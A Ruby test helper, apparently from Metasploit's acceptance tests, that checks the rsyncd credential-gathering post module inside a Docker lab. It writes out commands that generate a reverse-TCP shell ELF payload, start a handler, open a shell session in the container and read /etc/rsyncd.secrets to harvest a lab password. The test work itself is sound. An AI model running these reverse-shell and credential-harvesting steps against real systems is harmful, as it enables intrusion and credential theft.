# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'socket'
require 'timeout'
require 'rex/text'

# Native daemon, real shell/session and reporting controls for the rsync owner.
module RsyncCredentialTarget
  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'rsync-credentials.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_command(label, role, *args, required: true)
    command = target_runtime.fetch('compose') + ['exec', '-T', role, *args]
    output, error, status = Open3.capture3(*command)
    @rc.fetch(:commands) << { label: label, argv: command, exit: status.exitstatus, stdout_base64: Base64.strict_encode64(output.b), stderr: error }
    rc_save
    raise "Native command failed: #{label}: #{error}" if required && !status.success?

    [output, status.exitstatus]
  end

  def rc_native(phase)
    output, = rc_command(phase + '-native', 'linux', 'python3', '/opt/rsync-creds-native.py')
    data = JSON.parse(output)
    @rc.fetch(:native) << { phase: phase, data: data }
    rc_save
    expect(data.fetch('native_passed')).to be(true)
    expect(data.values_at('hostname', 'uid')).to eq(['module-target-rsync-creds', 0])
    data
  end

  def rc_resources(phase)
    %w[linux reporting_db].each do |role|
      %w[memory.events pids.events].each do |name|
        output, = rc_command(phase + '-' + role + '-' + name, role, 'cat', '/sys/fs/cgroup/' + name)
        values = output.lines.to_h do |line|
          key, value = line.split
          [key, value.to_i]
        end
        expect(values.values_at('oom', 'oom_kill')).to eq([0, 0]) if name == 'memory.events'
        expect(values.fetch('max')).to eq(0) if name == 'pids.events'
      end
    end
  end

  def rc_poll(seconds = 15)
    deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + seconds
    loop do
      value = yield
      return value if value
      raise 'Native state did not settle within the bound' if Process.clock_gettime(Process::CLOCK_MONOTONIC) >= deadline

      IO.select([], nil, nil, 0.1)
    end
  end

  def rc_json(code)
    response = console_command("irb -e #{('puts "RSYNC_JSON=" + (' + code + ').to_json').inspect}")
    match = response.match(/^RSYNC_JSON=(.+)$/)
    expect(match).not_to be_nil, response
    JSON.parse(match[1])
  end

  def rc_sql(query)
    output, = rc_command('reporting-sql', 'reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
    output
  end

  def rc_credentials
    expect(@workspace).to match(/\Arc_\d+_[a-z]+\z/)
    rows = JSON.parse(rc_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT c.id,p.username,secret.data AS private_data,secret.type AS private_type,
          c.origin_type,os.session_id,os.post_reference_name,l.id AS login_id,l.status,l.access_level,l.last_attempted_at,
          s.port,s.proto,s.name AS service,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id
        LEFT JOIN metasploit_credential_privates secret ON secret.id=c.private_id
        LEFT JOIN metasploit_credential_origin_sessions os ON os.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Session'
        LEFT JOIN metasploit_credential_logins l ON l.core_id=c.id
        LEFT JOIN services s ON s.id=l.service_id LEFT JOIN hosts h ON h.id=s.host_id
        WHERE w.name='#{@workspace}'
      ) row
    SQL
    @rc.fetch(:reports) << { workspace: @workspace, credentials: rows }
    rc_save
    rows
  end

  def rc_callback
    %w[127.0.0.1 0.0.0.0].each do |bind|
      server = TCPServer.new(bind, 0)
      port = server.local_address.ip_port
      token = 'native-rsync-' + Rex::Text.rand_text_alphanumeric(24)
      receiver = Thread.new do
        raise Timeout::Error, 'No native callback' unless IO.select([server], nil, nil, 8)

        peer = server.accept
        begin
          received = Timeout.timeout(5) { peer.read(token.bytesize) }
          peer.write('ACK:' + received)
          received
        ensure
          peer.close
        end
      end
      receiver.report_on_exception = false
      begin
        code = "import json,os,socket,sys;host=socket.gethostbyname('host.docker.internal');s=socket.create_connection((host,int(sys.argv[1])),4);s.settimeout(5);s.sendall(sys.argv[2].encode());reply=s.recv(1024).decode();s.close();print(json.dumps({'host':host,'reply':reply,'uid':os.geteuid()}))"
        output, status = rc_command('callback-' + bind, 'linux', 'python3', '-c', code, port.to_s, token, required: false)
        next unless status.zero?

        data = JSON.parse(output)
        expect(data.fetch('reply')).to eq('ACK:' + token)
        expect(Timeout.timeout(10) { receiver.value }).to eq(token)
        @rc[:callback] = { host: data.fetch('host'), bind: bind, exact_token: true }
        rc_save
        return @rc.fetch(:callback)
      ensure
        server.close
        receiver.kill if receiver.alive?
        receiver.join
      end
    end
    raise 'No native callback route passed'
  end

  def rc_session(label, user)
    @workspace = "rc_#{Process.pid}_#{label}"
    expect(console_command('workspace -a ' + @workspace)).to include(@workspace)
    callback = @rc.fetch(:callback)
    socket = TCPServer.new(callback.fetch(:bind), 0)
    port = socket.local_address.ip_port
    socket.close
    console_command('back')
    console_command('use payload/linux/x64/shell_reverse_tcp')
    console_command("set LHOST #{callback.fetch(:host)}")
    console_command("set LPORT #{port}")
    file = File.join(target_runtime.fetch('artifacts'), 'shell-session.elf')
    output = console_command("generate -f elf -o #{file}")
    expect(output).not_to match(/\[-\]|Error|Exception/)
    expect(File.binread(file)).to start_with("\x7fELF")
    @payload_sha = Digest::SHA256.file(file).hexdigest
    args = target_runtime.fetch('compose') + ['cp', file, 'linux:/opt/module-target-artifacts/shell-session.elf']
    copied, status = Open3.capture2e(*args)
    @rc.fetch(:commands) << { label: 'copy-payload', argv: args, exit: status.exitstatus, stdout_base64: Base64.strict_encode64(copied.b) }
    expect(status.success?).to be(true), copied
    console_command('back')
    console_command('use exploit/multi/handler')
    console_command('set PAYLOAD linux/x64/shell_reverse_tcp')
    console_command("set LHOST #{callback.fetch(:host)}")
    console_command("set LPORT #{port}")
    console_command("set ReverseListenerBindAddress #{callback.fetch(:bind)}")
    console_command('set ExitOnSession false')
    console_command('run -j')
    rc_poll do
      console_command('jobs')
      console.all_data.include?("Started reverse TCP handler on #{callback.fetch(:bind)}:#{port}")
    end
    output, = rc_command('launch-' + label, 'linux', 'python3', '/opt/launch_session.py', '/opt/module-target-artifacts/shell-session.elf', user)
    @launch = JSON.parse(output)
    @session = rc_poll(60) do
      rows = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,platform:s.platform,host:s.session_host,db_id:s.db_record&.id}}')
      rows.find { |row| row.fetch('type') == 'shell' && row['db_id'] && console.all_data.include?("Command shell session #{row.fetch('id')} opened") }
    end
    @proof_path = "/tmp/module-target-druid-session-#{Process.pid}_#{@session.fetch('id')}-#{@session.fetch('id')}"
    proof = rc_json("DruidSessionControl.proof(framework,#{@session.fetch('id')},#{@proof_path.inspect})")
    expect(proof).not_to have_key('error')
    marker, = rc_command('session-marker-' + label, 'linux', 'cat', @proof_path)
    expect(marker).to eq('druid-session')
    uid, = rc_command('session-uid-' + label, 'linux', 'stat', '-c', '%u', @proof_path)
    expect(uid.strip.to_i).to eq(user == 'root' ? 0 : 1001)
    @rc.fetch(:sessions) << { label: label, user: user, session: @session, proof: proof, launch: @launch, payload_sha256: @payload_sha }
    rc_save
    console_command('back')
    console_command('use post/multi/gather/rsyncd_creds')
    console_command("set SESSION #{@session.fetch('id')}")
    observed = rc_json('{owner_sha256:Digest::SHA256.file("modules/post/multi/gather/rsyncd_creds.rb").hexdigest,owner_source:active_module.method(:run).source_location,host_config_exists:File.exist?("/etc/rsyncd.conf"),config_sha256:Digest::SHA256.hexdigest(active_module.read_file("/etc/rsyncd.conf")),secret:active_module.read_file("/etc/rsyncd.secrets")}')
    @rc.fetch(:session_reads) << { label: label, data: observed }
    expect(observed.fetch('host_config_exists')).to be(false)
    expect(observed.fetch('owner_sha256')).to eq(Digest::SHA256.file('modules/post/multi/gather/rsyncd_creds.rb').hexdigest)
    expect(observed.fetch('config_sha256')).to eq(@baseline.fetch('files').fetch('/etc/rsyncd.conf').fetch('sha256'))
    expect(observed.fetch('secret')).to eq(user == 'root' ? "labuser:labpassword\n" : nil)
    expect(File.realpath(observed.fetch('owner_source').first)).to eq(File.realpath('modules/post/multi/gather/rsyncd_creds.rb'))
    rc_save
  end

  def rc_call(label, options)
    call = { label: label, workspace: @workspace, options: options, session: @session, started: true }
    @rc.fetch(:calls) << call
    run_target_module('post/multi/gather/rsyncd_creds', 'linux', { 'SESSION' => @session.fetch('id') }.merge(options), endpoint_options: {}, reuse_module: true, allow_errors: true, command_timeout: 120) do |output|
      call[:output_base64] = Base64.strict_encode64(output.b)
      call[:returned] = true
      call[:credentials] = rc_credentials
      call[:module_id] = rc_json('active_module.object_id')
      rc_save
    end
    call
  end

  def rc_cleanup
    if @session
      rc_json("DruidSessionControl.exit_remote(framework,#{@session.fetch('id')})")
    end
    if @launch
      code = 'import os,sys;pid=int(sys.argv[1]);print(os.path.exists("/proc/"+str(pid)))'
      rc_poll do
        output, = rc_command('session-pid-absent', 'linux', 'python3', '-c', code, @launch.fetch('pid').to_s)
        output.strip == 'False'
      end
    end
    if @session
      # An idle raw shell has no reader to notice EOF. First prove the remote
      # process exited, then explicitly remove the stale Framework registration.
      console_command("sessions -k #{@session.fetch('id')}") if rc_json('framework.sessions.keys').include?(@session.fetch('id'))
      rc_poll { !rc_json('framework.sessions.keys').include?(@session.fetch('id')) }
      rc_poll { rc_sql("SELECT closed_at IS NOT NULL FROM sessions WHERE id=#{@session.fetch('db_id')}").strip == 't' }
    end
    console_command('jobs -K')
    if @payload_sha
      code = 'from pathlib import Path;import hashlib,sys;files=[Path("/tmp/shell-session.elf"),Path("/opt/module-target-artifacts/shell-session.elf")];assert all(p.is_file() and hashlib.sha256(p.read_bytes()).hexdigest()==sys.argv[1] for p in files);[p.unlink() for p in files]'
      rc_command('remove-generated-payload', 'linux', 'python3', '-c', code, @payload_sha)
    end
    if @proof_path
      code = 'from pathlib import Path;import sys;p=Path(sys.argv[1]);assert p.read_bytes()==b"druid-session";p.unlink()'
      rc_command('remove-session-marker', 'linux', 'python3', '-c', code, @proof_path)
    end
    @rc.fetch(:cleanup) << { session: @session, launch: @launch, remote_process_absent: true, owned_artifacts_removed: true }
    @session = @launch = @payload_sha = @proof_path = nil
    rc_save
  end
end
